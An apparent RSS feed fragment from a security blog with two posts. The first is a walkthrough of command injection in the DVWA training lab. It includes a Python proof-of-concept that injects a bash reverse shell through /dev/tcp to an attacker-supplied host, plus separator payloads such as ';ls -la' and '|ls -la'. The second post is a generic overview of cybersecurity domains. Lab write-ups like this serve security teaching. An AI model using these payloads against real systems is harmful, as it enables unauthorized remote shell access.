+&lt;/ol></description></item><item><title>DVWA Command Injection</title><link>https://orangeymango.me/p/dvwa-command-injection/</link><pubDate>Wed, 06 Mar 2024 04:45:00 +0000</pubDate><guid>https://orangeymango.me/p/dvwa-command-injection/</guid><description>&lt;img src="https://cdn.acunetix.com/wp-content/uploads/2019/06/11110845/command-injection-910x478.png" alt="Featured image of post DVWA Command Injection" />&lt;h2 id="low-level">Low Level
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Functionality Check&lt;/strong>: Application accepts input in &lt;code>ip&lt;/code> parameter, directly passed to &lt;code>shell_exec()&lt;/code>.&lt;/li>
+&lt;li>&lt;strong>Injection&lt;/strong>: Concatenated &lt;code>;ls -la&lt;/code> as payload.&lt;/li>
+&lt;li>&lt;strong>Vulnerability&lt;/strong>: Lack of input validation allows command execution.&lt;/li>
+&lt;/ul>
+&lt;p>&lt;img src="https://orangeymango.me/cj/Untitled.png"
+loading="lazy"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">sys&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">url&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;http://127.0.0.1:42001/vulnerabilities/exec/&amp;gt;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;Cookie&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;PHPSESSID=&amp;lt;id&amp;gt;; security=&amp;lt;&amp;gt;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">/&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2"> 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;ip&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;;&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">ip&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;Submit&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;Submit&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">headers&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">headers&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="s2">&amp;#34;www-data&amp;#34;&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">response&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;success&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;failed&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">except&lt;/span> &lt;span class="ne">Exception&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;An error occurred:&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Usage: python3 poc.py &amp;lt;lhort&amp;gt; &amp;lt;lport&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">sys&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>The script serves as a Proof of Concept (PoC) to exploit a command injection vulnerability in a web application.&lt;/li>
+&lt;li>It demonstrates how an attacker can execute arbitrary commands on the target system through the vulnerability.&lt;/li>
+&lt;li>By injecting specially crafted commands, the attacker gains unauthorized access to the system.&lt;/li>
+&lt;li>This unauthorized access can lead to further exploitation, such as data theft, system compromise, or launching other attacks.&lt;/li>
+&lt;li>It&amp;rsquo;s crucial to emphasize that exploiting vulnerabilities without proper authorization is both illegal and unethical.&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="medium-level">Medium Level
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Functionality Check&lt;/strong>: Application continues to execute OS commands.&lt;/li>
+&lt;li>&lt;strong>Input Validation&lt;/strong>: Concatenated &lt;code>|&lt;/code> as payload.&lt;/li>
+&lt;li>&lt;strong>Bypass&lt;/strong>: Used &lt;code>|ls -la&lt;/code> payload for successful execution.&lt;/li>
+&lt;/ul>
+&lt;p>![](/cj/Untitled 1.png)&lt;/p>
+&lt;hr>
+&lt;h2 id="high-level">High Level
+&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>Functionality Check&lt;/strong>: Application still executes OS commands.&lt;/li>
+&lt;li>&lt;strong>Tightened Validation&lt;/strong>: Additional characters like &lt;code>&amp;amp;&lt;/code>, ``, &lt;code>$&lt;/code>, &lt;code>(&lt;/code> replaced with space.&lt;/li>
+&lt;li>&lt;strong>Bypass&lt;/strong>: Identified space after &lt;code>|&lt;/code> character, used &lt;code>127.0.0.1|ls -ls&lt;/code> payload for success.&lt;/li>
+&lt;/ul>
+&lt;p>![](/cj/Untitled 2.png)&lt;/p>
+&lt;hr></description></item><item><title>Basic Security</title><link>https://orangeymango.me/p/basic-security/</link><pubDate>Mon, 04 Mar 2024 11:27:22 +0000</pubDate><guid>https://orangeymango.me/p/basic-security/</guid><description>&lt;img src="https://dnycf48t040dh.cloudfront.net/fit-in/840x473/Basic-Guidelines-for-Internet-Security.jpeg" alt="Featured image of post Basic Security" />&lt;h1 id="basic-cybersecurity-practices-documentation">Basic Cybersecurity Practices Documentation
+&lt;/h1>&lt;h2 id="introduction">Introduction
+&lt;/h2>&lt;p>Cybersecurity is the practice of protecting computer systems, networks, and data from unauthorized access or damage. This document outlines basic cybersecurity practices to help individuals and organizations enhance their security posture.&lt;/p>
+&lt;h2 id="table-of-contents">Table of Contents
+&lt;/h2>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Security Domains Overview&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Network Security&lt;/li>
+&lt;li>Application Security&lt;/li>
+&lt;li>Cloud Security&lt;/li>
+&lt;li>Mobile Security&lt;/li>
+&lt;li>IoT Security&lt;/li>
+&lt;li>Data Security&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Additional Topics&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Password Management&lt;/li>
+&lt;li>Software Updates&lt;/li>
+&lt;li>Phishing Awareness&lt;/li>
+&lt;li>Data Backup&lt;/li>
+&lt;li>Device Security&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="security-domains-overview">Security Domains Overview
+&lt;/h2>&lt;h2 id="network-security">Network Security
+&lt;/h2>&lt;p>Network security involves the practices and technologies implemented to protect a network and its data from unauthorized access or breaches. This encompasses a range of measures designed to ensure the confidentiality, integrity, and availability of network resources.&lt;/p>
+&lt;h3 id="key-components">Key Components:
+&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>Firewalls:&lt;/strong> Firewalls are crucial components of network security, acting as a barrier between internal and external networks. They inspect and control incoming and outgoing traffic based on predetermined security rules.&lt;/li>
+&lt;li>&lt;strong>Intrusion Detection Systems (IDS):&lt;/strong> IDS monitor network traffic for suspicious activities or patterns that may indicate a potential security breach. They provide real-time alerts to security administrators to mitigate threats promptly.&lt;/li>
+&lt;li>&lt;strong>Virtual Private Networks (VPN):&lt;/strong> VPNs establish secure, encrypted connections over public networks, allowing remote users to access private network resources securely. They ensure data confidentiality and integrity for communication between endpoints.&lt;/li>
+&lt;/ol>
+&lt;h3 id="additional-measures">Additional Measures:
+&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Access Control:&lt;/strong> Implementing robust access control mechanisms, such as role-based access control (RBAC) and network segmentation, to restrict unauthorized access to network resources.&lt;/li>
+&lt;li>&lt;strong>Encryption:&lt;/strong> Encrypting sensitive data transmitted over the network to prevent eavesdropping and data interception by unauthorized parties.&lt;/li>
+&lt;li>&lt;strong>Patch Management:&lt;/strong> Regularly updating and patching network devices, including routers, switches, and firewalls, to address known vulnerabilities and mitigate potential security risks.&lt;/li>
+&lt;li>&lt;strong>Monitoring and Logging:&lt;/strong> Continuously monitoring network traffic and logging relevant events to detect and investigate security incidents effectively.&lt;/li>
+&lt;/ul>
+&lt;h3 id="emerging-trends">Emerging Trends:
+&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Zero Trust Networking:&lt;/strong> Adopting a Zero Trust approach, where no entity, whether inside or outside the network perimeter, is trusted by default. Every user and device must authenticate and authorize before accessing network resources.&lt;/li>
+&lt;li>&lt;strong>Software-Defined Networking (SDN):&lt;/strong> Utilizing SDN technologies to centrally manage and enforce network security policies dynamically, enhancing flexibility and scalability while maintaining security.&lt;/li>
+&lt;/ul>
+&lt;p>Network security is a critical aspect of overall cybersecurity strategy, playing a pivotal role in safeguarding organizational assets and sensitive information from cyber threats.&lt;/p>
+&lt;h2 id="application-security">Application Security
+&lt;/h2>&lt;p>Application security is a critical aspect of cybersecurity that focuses on safeguarding software applications from threats and vulnerabilities throughout their entire lifecycle, from development to deployment and maintenance. It encompasses various practices and techniques aimed at ensuring the confidentiality, integrity, and availability of applications and the data they handle.&lt;/p>
+&lt;h3 id="key-components-1">Key Components:
+&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>Secure Coding Practices:&lt;/strong> Implementing secure coding practices is essential to prevent common vulnerabilities such as injection flaws, cross-site scripting (XSS), and insecure direct object references. This includes adhering to secure coding guidelines, input validation, and proper error handling.&lt;/li>
+&lt;li>&lt;strong>Penetration Testing:&lt;/strong> Penetration testing, also known as ethical hacking, involves simulating real-world attacks on applications to identify and exploit vulnerabilities. This proactive approach helps uncover potential weaknesses before malicious actors can exploit them.&lt;/li>
+&lt;li>&lt;strong>Security Libraries and Frameworks:&lt;/strong> Leveraging security libraries and frameworks can streamline the development process while incorporating built-in security features. Popular examples include OWASP (Open Web Application Security Project) libraries, Spring Security for Java applications, and Django security features for Python-based web applications.&lt;/li>
+&lt;/ol>
+&lt;h3 id="additional-measures-1">Additional Measures:
+&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Authentication and Authorization:&lt;/strong> Implementing strong authentication mechanisms, such as multi-factor authentication (MFA) and OAuth, to verify the identity of users and enforce access controls based on their roles and permissions.&lt;/li>
+&lt;li>&lt;strong>Data Encryption:&lt;/strong> Encrypting sensitive data at rest and in transit using industry-standard encryption algorithms to protect against unauthorized access and data breaches.&lt;/li>
+&lt;li>&lt;strong>Security Testing:&lt;/strong> Conducting regular security assessments, including code reviews, static and dynamic application security testing (SAST and DAST), and fuzz testing, to identify and remediate security vulnerabilities proactively.&lt;/li>
+&lt;li>&lt;strong>Secure Software Development Lifecycle (SDLC):&lt;/strong> Integrating security into every phase of the software development lifecycle, from requirements gathering to deployment and maintenance, through practices such as threat modeling and security-focused design reviews.&lt;/li>
+&lt;/ul>
+&lt;h3 id="emerging-trends-1">Emerging Trends:
+&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>DevSecOps:&lt;/strong> Integrating security into the DevOps process (DevSecOps) by automating security testing and compliance checks, fostering collaboration between development, operations, and security teams, and promoting a culture of shared responsibility for security.&lt;/li>
+&lt;li>&lt;strong>Container Security:&lt;/strong> Addressing security challenges associated with containerized applications by implementing container-specific security measures, such as image scanning for vulnerabilities, runtime protection, and container orchestration platform security.&lt;/li>
+&lt;/ul>
+&lt;p>Application security is essential to mitigate the risk of data breaches, unauthorized access, and other security incidents, ultimately ensuring the trustworthiness and reliability of software applications in today&amp;rsquo;s digital landscape.&lt;/p>
+&lt;h2 id="cloud-security">Cloud Security
+&lt;/h2>&lt;p>Cloud security is a crucial aspect of cybersecurity that focuses on protecting data, applications, and infrastructure hosted on cloud platforms. As organizations increasingly adopt cloud services for their operations, ensuring the confidentiality, integrity, and availability of cloud resources becomes paramount.&lt;/p>
+&lt;h3 id="key-components-2">Key Components:
+&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>Encryption:&lt;/strong> Implementing encryption mechanisms to protect data both at rest and in transit within the cloud environment. This includes using robust encryption algorithms and managing encryption keys securely to prevent unauthorized access.&lt;/li>
+&lt;li>&lt;strong>Identity and Access Management (IAM):&lt;/strong> Establishing robust IAM policies and controls to manage user identities, permissions, and access to cloud resources. This involves authentication mechanisms, role-based access control (RBAC), and least privilege principles to enforce access restrictions effectively.&lt;/li>
+&lt;li>&lt;strong>Compliance with Standards:&lt;/strong> Ensuring compliance with regulatory requirements and industry standards relevant to cloud security, such as GDPR (General Data Protection Regulation), HIPAA (Health Insurance Portability and Accountability Act), and ISO/IEC 27001. Adhering to cloud service provider security standards and certifications, such as SOC 2 (Service Organization Control 2) and CSA STAR (Cloud Security Alliance Security, Trust &amp;amp; Assurance Registry), also enhances cloud security posture.&lt;/li>
+&lt;/ol>
+&lt;h3 id="additional-measures-2">Additional Measures:
+&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Network Security:&lt;/strong> Implementing network security controls, such as firewalls, intrusion detection and prevention systems (IDPS), and virtual private networks (VPNs), to protect cloud infrastructure from unauthorized access and cyber threats.&lt;/li>
+&lt;li>&lt;strong>Data Loss Prevention (DLP):&lt;/strong> Deploying DLP solutions to monitor and prevent the unauthorized sharing or leakage of sensitive data stored in the cloud. This involves identifying and classifying sensitive data, enforcing data loss prevention policies, and detecting and responding to potential data breaches.&lt;/li>
+&lt;li>&lt;strong>Security Monitoring and Logging:&lt;/strong> Implementing robust monitoring and logging mechanisms to track user activities, detect security incidents, and facilitate incident response and forensic analysis in the cloud environment.&lt;/li>
+&lt;li>&lt;strong>Security Governance and Risk Management:&lt;/strong> Establishing governance frameworks and risk management processes specific to cloud environments to ensure ongoing compliance, risk assessment, and mitigation efforts.&lt;/li>
+&lt;/ul>
+&lt;h3 id="emerging-trends-2">Emerging Trends:
+&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Cloud-native Security Solutions:&lt;/strong> Embracing cloud-native security solutions designed specifically for cloud environments, such as cloud access security brokers (CASBs), cloud workload protection platforms (CWPPs), and cloud security posture management (CSPM) tools.&lt;/li>
+&lt;li>&lt;strong>Serverless Security:&lt;/strong> Addressing security challenges associated with serverless computing models, such as Function-as-a-Service (FaaS), by implementing security controls at the application level and leveraging serverless-specific security solutions.&lt;/li>
+&lt;/ul>
+&lt;p>Cloud security is essential for organizations leveraging cloud services to mitigate the risks associated with data breaches, data loss, and unauthorized access, ultimately ensuring the trust and integrity of cloud-based resources.&lt;/p>
+&lt;h2 id="mobile-security">Mobile Security
+&lt;/h2>&lt;p>Mobile security is a critical aspect of cybersecurity that focuses on securing mobile devices such as smartphones and tablets, as well as the applications and data they access. With the widespread adoption of mobile technology in both personal and professional settings, ensuring the confidentiality, integrity, and availability of mobile devices and the information they store or transmit is essential.&lt;/p>
+&lt;h3 id="key-components-3">Key Components:
+&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>Device Encryption:&lt;/strong> Implementing device-level encryption to protect the data stored on mobile devices from unauthorized access in case of loss or theft. This includes encrypting the device&amp;rsquo;s file system and data partitions to prevent data leakage.&lt;/li>
+&lt;li>&lt;strong>Mobile Device Management (MDM):&lt;/strong> Employing MDM solutions to manage and secure mobile devices across the organization. MDM enables administrators to enforce security policies, remotely configure devices, and track device inventory to mitigate security risks.&lt;/li>
+&lt;li>&lt;strong>Secure App Development:&lt;/strong> Adhering to secure coding practices and guidelines when developing mobile applications to mitigate common vulnerabilities such as insecure data storage, insufficient authentication, and improper session management. This involves implementing encryption for data transmission, secure authentication mechanisms, and secure storage of sensitive data.&lt;/li>
+&lt;/ol>
+&lt;h3 id="additional-measures-3">Additional Measures:
+&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Mobile Application Management (MAM):&lt;/strong> Implementing MAM solutions to manage and secure mobile applications deployed within the organization. MAM enables administrators to control access to corporate apps, enforce app-level security policies, and remotely wipe corporate data from lost or stolen devices.&lt;/li>
+&lt;li>&lt;strong>Network Security:&lt;/strong> Securing mobile devices&amp;rsquo; network connections through measures such as virtual private networks (VPNs), secure Wi-Fi connections, and encrypted communication protocols to protect data transmitted over public networks.&lt;/li>
+&lt;li>&lt;strong>App Store Security:&lt;/strong> Educating users about the risks associated with downloading apps from untrusted sources and promoting the use of official app stores that enforce security standards and conduct app vetting processes to mitigate the risk of malicious apps.&lt;/li>
+&lt;li>&lt;strong>Mobile Threat Defense (MTD):&lt;/strong> Deploying MTD solutions to detect and mitigate mobile-specific threats such as malware, phishing attacks, and network spoofing. MTD solutions employ techniques such as behavioral analysis, app reputation scanning, and device posture assessment to identify and respond to security threats.&lt;/li>
+&lt;/ul>
+&lt;h3 id="emerging-trends-3">Emerging Trends:
+&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Zero Trust Mobile Security:&lt;/strong> Adopting a Zero Trust approach to mobile security, where devices, applications, and users are continuously authenticated and authorized based on their trustworthiness and compliance with security policies, regardless of their location or network environment.&lt;/li>
+&lt;li>&lt;strong>Mobile Identity and Access Management (IAM):&lt;/strong> Implementing mobile-centric IAM solutions that provide seamless and secure access to corporate resources from mobile devices while ensuring strong authentication and authorization mechanisms tailored for mobile use cases.&lt;/li>
+&lt;/ul>
+&lt;p>Mobile security is crucial for protecting sensitive data, maintaining user privacy, and safeguarding the integrity of mobile devices and applications in an increasingly mobile-centric world.&lt;/p>
+&lt;h2 id="iot-security">IoT Security
+&lt;/h2>&lt;p>IoT security is a critical aspect of cybersecurity that focuses on securing interconnected devices and systems in the Internet of Things (IoT) ecosystem. With the proliferation of IoT devices across various industries, ensuring the confidentiality, integrity, and availability of IoT systems and the data they generate becomes paramount.&lt;/p>
+&lt;h3 id="key-components-4">Key Components:
+&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>Securing IoT Devices:&lt;/strong> Implementing security measures at the device level to protect IoT endpoints from unauthorized access and cyber threats. This includes hardening device firmware, disabling unnecessary services, and regularly updating device firmware and software to address known vulnerabilities.&lt;/li>
+&lt;li>&lt;strong>Data Encryption:&lt;/strong> Encrypting data transmitted between IoT devices and backend systems to prevent unauthorized interception and tampering. Implementing robust encryption algorithms and key management practices ensures the confidentiality and integrity of IoT data throughout its lifecycle.&lt;/li>
+&lt;li>&lt;strong>Strong Authentication Mechanisms:&lt;/strong> Implementing strong authentication mechanisms, such as mutual authentication and certificate-based authentication, to verify the identity of IoT devices and establish secure communication channels. This prevents unauthorized devices from accessing IoT networks and services.&lt;/li>
+&lt;/ol>
+&lt;h3 id="additional-measures-4">Additional Measures:
+&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Network Segmentation:&lt;/strong> Segmenting IoT devices into isolated network segments or VLANs (Virtual Local Area Networks) to limit the potential impact of security breaches and prevent lateral movement within IoT networks.&lt;/li>
+&lt;li>&lt;strong>Device Lifecycle Management:&lt;/strong> Implementing robust device lifecycle management practices, including secure device provisioning, monitoring device health, and decommissioning end-of-life devices securely to mitigate security risks associated with outdated or vulnerable devices.&lt;/li>
+&lt;li>&lt;strong>Security Monitoring and Incident Response:&lt;/strong> Implementing continuous security monitoring of IoT devices and networks to detect suspicious activities and security incidents. Establishing incident response procedures enables prompt identification, containment, and mitigation of security breaches in IoT environments.&lt;/li>
+&lt;li>&lt;strong>Regulatory Compliance:&lt;/strong> Ensuring compliance with industry-specific regulations and standards governing IoT security, such as the IoT Cybersecurity Improvement Act, GDPR (General Data Protection Regulation), and industry-specific standards like ISO/IEC 27001.&lt;/li>
+&lt;/ul>
+&lt;h3 id="emerging-trends-4">Emerging Trends:
+&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Blockchain for IoT Security:&lt;/strong> Exploring the use of blockchain technology to enhance the security and integrity of IoT data through decentralized and tamper-resistant data storage and authentication mechanisms.&lt;/li>
+&lt;li>&lt;strong>Edge Computing Security:&lt;/strong> Addressing security challenges associated with edge computing deployments in IoT environments by implementing security controls at the network edge, including edge firewalls, intrusion detection systems (IDS), and secure communication protocols.&lt;/li>
+&lt;/ul>
+&lt;p>IoT security is essential for protecting critical infrastructure, ensuring data privacy, and maintaining the trustworthiness and reliability of IoT systems in an interconnected and digitally transformed world.&lt;/p>
+&lt;h2 id="data-security">Data Security
+&lt;/h2>&lt;p>Data security is a fundamental aspect of cybersecurity that focuses on safeguarding sensitive data from unauthorized access, disclosure, or modification. With the increasing volume and value of data in today&amp;rsquo;s digital landscape, protecting data confidentiality, integrity, and availability is paramount.&lt;/p>
+&lt;h3 id="key-components-5">Key Components:
+&lt;/h3>&lt;ol>
+&lt;li>&lt;strong>Encryption:&lt;/strong> Implementing encryption techniques to transform plaintext data into ciphertext, rendering it unreadable to unauthorized individuals or entities. Encryption ensures data confidentiality by protecting data both at rest and in transit.&lt;/li>
+&lt;li>&lt;strong>Access Controls:&lt;/strong> Enforcing access controls to regulate and restrict user access to sensitive data based on predefined permissions and privileges. Access controls encompass mechanisms such as role-based access control (RBAC), access control lists (ACLs), and mandatory access control (MAC) to prevent unauthorized data access.&lt;/li>
+&lt;li>&lt;strong>Data Masking:&lt;/strong> Applying data masking techniques to conceal sensitive data elements within datasets while retaining their format and structure. Data masking ensures that only authorized individuals can access the original data, reducing the risk of data exposure during non-production activities such as testing and analytics.&lt;/li>
+&lt;li>&lt;strong>Data Loss Prevention (DLP):&lt;/strong> Implementing DLP solutions to monitor, detect, and prevent unauthorized data exfiltration or leakage. DLP technologies analyze data flows, identify sensitive data patterns, and enforce security policies to mitigate the risk of data breaches or data loss incidents.&lt;/li>
+&lt;/ol>
+&lt;h3 id="additional-measures-5">Additional Measures:
+&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Data Classification:&lt;/strong> Classifying data based on its sensitivity and importance to determine appropriate security controls and protection mechanisms. Data classification enables organizations to prioritize data security efforts and allocate resources effectively.&lt;/li>
+&lt;li>&lt;strong>Data Backup and Recovery:&lt;/strong> Establishing regular data backup procedures and implementing robust data recovery mechanisms to ensure data availability and resilience against data loss incidents such as hardware failures, natural disasters, or cyber attacks.&lt;/li>
+&lt;li>&lt;strong>Audit Trails and Logging:&lt;/strong> Maintaining comprehensive audit trails and logging mechanisms to record user activities, data access events, and system changes. Audit trails facilitate forensic analysis, compliance auditing, and incident response investigations in the event of security incidents.&lt;/li>
+&lt;li>&lt;strong>Data Privacy Compliance:&lt;/strong> Ensuring compliance with data privacy regulations and standards, such as the General Data Protection Regulation (GDPR), Health Insurance Portability and Accountability Act (HIPAA), and Payment Card Industry Data Security Standard (PCI DSS), to protect sensitive data and uphold individual privacy rights.&lt;/li>
+&lt;/ul>
+&lt;h3 id="emerging-trends-5">Emerging Trends:
+&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Homomorphic Encryption:&lt;/strong> Exploring homomorphic encryption techniques that allow for computation on encrypted data without decrypting it, enabling secure data processing and analysis while preserving data confidentiality.&lt;/li>
+&lt;li>&lt;strong>Secure Multiparty Computation (MPC):&lt;/strong> Leveraging MPC protocols to enable multiple parties to jointly compute on encrypted data while keeping the data confidential, ensuring privacy-preserving data collaboration and analysis.&lt;/li>
+&lt;/ul>
+&lt;p>Data security is essential for maintaining trust, integrity, and compliance in data-driven organizations, safeguarding sensitive information from unauthorized access or misuse.&lt;/p>
